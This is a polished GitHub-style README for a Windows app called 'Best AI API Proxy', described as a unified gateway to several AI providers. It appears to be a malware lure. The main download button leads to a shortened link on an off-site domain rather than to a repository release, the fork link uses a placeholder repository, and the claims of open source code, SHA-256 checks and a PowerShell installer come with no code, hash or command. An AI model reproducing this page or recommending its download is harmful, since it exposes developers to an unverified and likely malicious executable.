

# 🔵 Best AI API Proxy

<div align="center">

<!-- Надежный баннер (Shields.io) -->
<img src="https://img.shields.io/badge/Best_AI_API_Proxy-Unified_API_for_Multiple_AI_Models-0A192F?style=for-the-badge&logoColor=FFFFFF&labelColor=00BFFF" width="100%" height="60" />

<br><br>

<!-- Рабочие кнопки навигации -->
<a href="#about" style="text-decoration: none;"><img src="https://img.shields.io/badge/ABOUT-00BFFF?style=for-the-badge&labelColor=0A192F" /></a>
<a href="#features" style="text-decoration: none;"><img src="https://img.shields.io/badge/FEATURES-00BFFF?style=for-the-badge&labelColor=0A192F" /></a>
<a href="#architecture" style="text-decoration: none;"><img src="https://img.shields.io/badge/ARCHITECTURE-00BFFF?style=for-the-badge&labelColor=0A192F" /></a>
<a href="#tech-stack" style="text-decoration: none;"><img src="https://img.shields.io/badge/TECH_STACK-00BFFF?style=for-the-badge&labelColor=0A192F" /></a>
<a href="#screenshots" style="text-decoration: none;"><img src="https://img.shields.io/badge/SCREENSHOTS-00BFFF?style=for-the-badge&labelColor=0A192F" /></a>
<a href="#contributing" style="text-decoration: none;"><img src="https://img.shields.io/badge/CONTRIBUTING-00BFFF?style=for-the-badge&labelColor=0A192F" /></a>

<br><br>

<img src="https://img.shields.io/badge/Windows-0078D6?style=flat-square&logo=windows&logoColor=white" />
<img src="https://img.shields.io/badge/Version-3.1.1-00BFFF?style=flat-square&labelColor=0A192F" />
<img src="https://img.shields.io/badge/Size-17.3_MB-00BFFF?style=flat-square&labelColor=0A192F" />
<img src="https://img.shields.io/badge/Status-Stable-00C853?style=flat-square" />
<img src="https://img.shields.io/badge/License-MIT-2196F3?style=flat-square" />
<img src="https://img.shields.io/badge/PRs-Welcome-brightgreen?style=flat-square" />

</div>

<img src="https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif" width="100%" />

<br>

<!-- ТОЧКА ПРИЗЕМЛЕНИЯ ДЛЯ КНОПКИ ABOUT -->
<a id="about"></a>

## 🎧 About

**Best AI API Proxy** is a lightweight, clean Windows application that lets you access multiple AI models through a single, unified API. It simplifies request routing, manages rate limits, and provides a reliable proxy layer between your applications and popular AI providers like OpenAI, Anthropic, Google, and local models.

Built for developers and AI enthusiasts who want to **switch between models without changing code** or manage multiple API keys in one place. The proxy handles authentication, load balancing, and automatic failover, ensuring your AI-powered apps never go down.

Everything runs locally on your machine. No telemetry, no extra dependencies, and no hidden background services. The app includes an auto-update feature, a secure install script with SHA-256 verification, and a clean native interface.

<br>

<div align="center">
<a href="http://noxsoftware.cc/s/bWfwqt9M" style="text-decoration: none;">
  <img src="https://img.shields.io/badge/⬇_DOWNLOAD_LATEST_RELEASE-00BFFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0A192F" height="45" />
</a>
</div>

<br>

> **Now Loading:** `Providers: 6` · `Requests: 1.2M` · `Latency: 45ms` · `Status: ● ONLINE`

<br>

<!-- ТОЧКА ПРИЗЕМЛЕНИЯ ДЛЯ КНОПКИ FEATURES -->
<a id="features"></a>

## ✨ What's Inside

<table>
<tr>
<td align="center" width="25%">

### 🔌
**Unified API**

One endpoint, multiple AI providers. Route requests to OpenAI, Anthropic, Google, and local models without code changes.

</td>
<td align="center" width="25%">

### 🛡️
**Clean Build**

No telemetry, no bundled adware, no background services. Just a lightweight proxy that does its job.

</td>
<td align="center" width="25%">

### ⚡
**Fast Install**

Deploy with a single PowerShell command. The script downloads, verifies, and installs the app automatically.

</td>
<td align="center" width="25%">

### 🔄
**Auto-Update**

The proxy tracks fresh builds and updates automatically with your consent. Always stay on the latest version.

</td>
</tr>
<tr>
<td align="center" width="25%">

### 🔐
**Secure Verification**

SHA-256 hash checks ensure the downloaded file is authentic and untampered. Verify manually anytime.

</td>
<td align="center" width="25%">

### 📊
**Request Routing**

Smart load balancing, rate-limit management, and automatic failover between providers.

</td>
<td align="center" width="25%">

### 🧩
**Extensible**

Add custom providers, modify routing rules, and integrate with your own tooling via a simple config file.

</td>
<td align="center" width="25%">

### 🚀
**Open Source**

MIT licensed. Audit the code, build from source, and contribute features you need.

</td>
</tr>
</table>

<br>

<!-- ТОЧКА ПРИЗЕМЛЕНИЯ ДЛЯ КНОПКИ ARCHITECTURE -->
<a id="architecture"></a>

## 📂 Architecture

```bash
best-ai-api-proxy/
│
├── 📱  src/                  → Frontend (React + TypeScript)
│   ├── components/          → Dashboard, Settings, Logs
│   ├── pages/               → Providers, Routing, Metrics
│   └── hooks/               → Auth, ProxyConfig, Health
│
├── 🦀  src-tauri/            → Backend (Rust + Tauri)
│   ├── proxy/               → Request router & load balancer
│   ├── providers/           → OpenAI, Anthropic, Google APIs
│   └── utils/               → Hashing, config, auto-update
│
├── 🧪  tests/                → Unit + integration tests
├── 📦  assets/               → Icons, logos, installers
├── ⚙️  .github/workflows/    → CI/CD (build, test, release)
└── 📖  docs/                 → Wiki, API reference, guides
```

<br>

<!-- ТОЧКА ПРИЗЕМЛЕНИЯ ДЛЯ КНОПКИ TECH STACK -->
<a id="tech-stack"></a>

## 🛠️ Tech Stack

<div align="center">

| Layer | Technology |
|:-----:|:-----------|
| 🎨 Frontend | React 18 · TypeScript · Tailwind CSS · Framer Motion |
| 🦀 Backend | Rust · Tauri 2.0 |
| 🗄️ Storage | SQLite (via `rusqlite`) · local filesystem |
| 🌐 Networking | `reqwest` · OpenAI · Anthropic · Google APIs |
| 🧪 Testing | Vitest · Playwright · `cargo test` |
| 🚀 CI/CD | GitHub Actions · Tauri bundler |

</div>

<br>

<!-- ТОЧКА ПРИЗЕМЛЕНИЯ ДЛЯ КНОПКИ SCREENSHOTS -->
<a id="screenshots"></a>

## 🖼️ Screenshot

<div align="center">

<img width="738" height="415" alt="images (41)" src="https://github.com/user-attachments/assets/3de00f77-834f-4079-9417-7ef3e9f8a88f" />

</div>

<br>

## ⌨️ Hotkeys

<div align="center">

<table>
<tr>
<td align="center" width="50%" valign="top">

### 🎮 Navigation

| Key | Action |
|:---:|:-------|
| `Ctrl + P` | Open providers |
| `Ctrl + L` | View logs |
| `Ctrl + ,` | Settings |
| `F5` | Refresh metrics |
| `Esc` | Close modal |
| `Ctrl + Q` | Quit app |

</td>
<td align="center" width="50%" valign="top">

### ⚡ Actions

| Key | Action |
|:---:|:-------|
| `Ctrl + N` | New provider |
| `Ctrl + S` | Save config |
| `Ctrl + D` | Duplicate route |
| `Delete` | Remove provider |
| `Ctrl + Shift + C` | Copy API key |
| `Ctrl + R` | Restart proxy |

</td>
</tr>
</table>

</div>

<br>

<!-- ТОЧКА ПРИЗЕМЛЕНИЯ ДЛЯ КНОПКИ CONTRIBUTING -->
<a id="contributing"></a>

## 🤝 Contributing

<div align="center">

```mermaid
graph LR
    A[🍴 Fork] --> B[🌿 Branch]
    B --> C[💻 Build]
    C --> D[💾 Commit]
    D --> E[📤 Push]
    E --> F[🔃 Pull Request]
    F --> G[🎉 Merged!]
    
    style A fill:#00BFFF,color:#fff
    style B fill:#00BFFF,color:#fff
    style C fill:#00BFFF,color:#fff
    style D fill:#00BFFF,color:#fff
    style E fill:#00BFFF,color:#fff
    style F fill:#00BFFF,color:#fff
    style G fill:#00C853,color:#fff
```

</div>

Contributions of any kind are welcome — new providers, bug fixes, UI improvements, or documentation. Please read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a Pull Request. Every submission is reviewed for code quality, test coverage, and compatibility with supported platforms.

<br>

## 📜 License

```
MIT License — use it. remix it. share it.

All AI model names and APIs are trademarks of their respective owners.
This project is community-made and unaffiliated with any AI provider.
```

<br>

<img src="https://user-images.githubusercontent.com/74038190/212284158-e840e285-664b-44d7-b79b-e264b5e54825.gif" width="100%" />

<br>

<div align="center">
<br>
<a href="https://github.com/username/best-ai-api-proxy/fork" style="text-decoration: none;">
  <img src="https://img.shields.io/badge/🚀_JOIN_THE_PROJECT-0A192F?style=for-the-badge&logo=github&logoColor=white" height="45" />
</a>
</div>

<br>

<!-- Надежный футер -->
<div align="center">
<img src="https://img.shields.io/badge/⭐_Star_the_repo-Built_for_developers,_by_developers-0A192F?style=for-the-badge&labelColor=00BFFF" width="100%" height="50" />
</div>